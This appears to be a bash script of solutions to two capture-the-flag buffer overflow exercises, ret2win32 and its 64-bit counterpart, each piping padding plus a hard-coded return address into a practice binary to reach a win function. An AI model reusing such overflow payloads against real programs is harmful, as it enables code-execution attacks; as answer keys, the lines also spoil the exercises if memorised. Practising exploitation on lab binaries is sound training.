#!/bin/bash

################################################################################
echo "RET2WIN32"
## SOLUTION TO RET2WIN32

unzip ret2win32.zip

python -c 'print "A"*44+"\x59\x86\x04\x08"' | ./ret2win32

################################################################################
echo "RET2WIN"
## SOLUTION TO RET2WIN (64bit)

unzip ret2win.zip

python -c 'print "A"*40+"\x11\x08\x40\x00\x00\x00\x00\x00"' | ./ret2win